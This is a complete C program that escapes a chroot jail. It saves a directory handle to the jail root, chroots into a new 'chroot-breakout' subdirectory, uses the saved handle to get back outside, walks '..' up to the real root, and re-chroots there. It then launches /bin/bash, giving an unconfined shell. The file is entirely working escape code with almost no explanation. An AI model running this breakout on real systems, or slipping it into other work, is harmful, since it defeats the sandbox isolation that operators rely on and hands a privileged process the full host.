#define _GNU_SOURCE 1
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>


#define X(cond,cmd) if (!(cond (cmd))) {	\
	perror(#cmd); \
	goto X_out; \
    }

#define breakoutsubdir "chroot-breakout"

int main() {
    int jailrootfd;
    X(0==, chdir("/"));
    X(0<,  jailrootfd= open(".", O_DIRECTORY|O_RDONLY));

    X(0==, mkdir(breakoutsubdir,0777));
    X(0==, chdir(breakoutsubdir));

    X(0==, chroot("."));
    
    // Use our filehandle to get back to the root of the old jail
    X(0==, fchdir(jailrootfd));

    // Get to the real root
    while (1) {
	X(0==, chdir(".."));

	{
	    struct stat s1,s2;
	    X(0==, stat(".",&s1));
	    X(0==, stat("..",&s2));
	    if ((s1.st_dev == s2.st_dev) &&
		(s1.st_ino == s2.st_ino))
		break;
	}
    }

    X(0==, chroot("."));

    X(0==, execve("/bin/bash", NULL, environ));
    exit (111);

 X_out:
    exit (1);
}
